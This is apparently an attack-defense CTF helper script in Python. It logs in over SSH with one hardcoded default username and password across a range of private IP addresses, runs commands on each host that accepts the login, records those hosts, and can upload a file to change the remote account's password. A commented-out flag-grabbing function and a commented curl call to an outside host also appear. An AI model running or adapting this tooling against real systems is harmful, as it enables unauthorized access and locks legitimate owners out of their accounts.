#!/usr/bin/env python3
import paramiko

class Kill(object):
    def __init__(self,ip,username,passwd,port=22):
        self.ip=ip
        self.name=username
        self.pwd=passwd
        self.port=port
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh.connect(self.ip, self.port, self.name, self.pwd, timeout=10)
    def execute(self,cmd):
        try:
            #cmd is a command list
            for m in cmd:
                self.stdin,self.stdout,self.stderr=self.ssh.exec_command(m)
                self.out=self.stdout.readlines()
                for o in self.out:
                    print(o)
            print("%s execute commands OK\n"%self.ip)
        except Exception as e:
            print("%s has error:%s"%(self.ip,e))
    def chpasswd(self):
        self.forftp=paramiko.Transport((self.ip,self.port))
        self.forftp.connect(username=self.name,password=self.pwd)
        self.sftp=paramiko.SFTPClient.from_transport(self.forftp)
        local_path="./ssh_execute_chpwd.txt"
        remote_path="/tmp/pwd.txt"
        #If you want to download from remote,use self.sftp.get(remote_path,local_path)
        self.sftp.put(local_path,remote_path)
        cmd=["passwd < %s"%remote_path,]
        self.execute(cmd)
"""
def getflag(ip,username,passwd,cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, 22, username, passwd, timeout=10)
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
            #           stdin.write("Y")   #简单交互，输入 ‘Y’
            out = stdout.readlines()
            # 屏幕输出
            for o in out:
                print(o)
        print('%s\tOK\n' % (ip))
        ssh.close()
    except:
        print('%s\tError\n' % (ip))
"""


def main():
    #Chang the password:
    #Debian-----Only root can use echo to change the passwd like this: echo "user:password"|chpasswd
    #Other Linux-------Only root can do this: echo password|passwd --stdin username / echo "user:password"|chpasswd
    #If you are not root,use this way:
    """
    [test@hpcstack ~]$ passwd < /tmp/passwd.log
    Changing password for user test.
    Changing password for test.
    (current) UNIX password: New password: Retype new password: passwd: all authentication tokens updated successfully.
    [test@hpcstack ~]$ cat /tmp/passwd.log
    thisisatest
    testbaoyiluo
    testbaoyiluo
    但此时新密码要求满足linux普通用户密码规则
    """
    ip_base='192.168.67.'
    #cmd=['curl http://10.12.101.181/?r=f/v',]
    cmd=["pwd",]
    valid_ip_list=[]
    for i in range(133,152):
        ip=ip_base+str(i)
        try:
            #use init username and password
            k=Kill(ip,'vanpersiexp','120221')
            #k.chpasswd()
            k.execute(cmd)
            print("*"*30)
            valid_ip_list.append(ip)
        except Exception as e:
            print("%s has Authentication/Network error:%s"%(ip,e))
            print("*"*30)
            continue
        finally:
            try:
                k.ssh.close()
            except Exception:
                pass
    with open("./valid_ip_ssh.txt",'w') as f:
        if len(valid_ip_list)>0:
            for ip in valid_ip_list:
                f.write(ip)
                f.write("\n")
if __name__=='__main__':
    main()


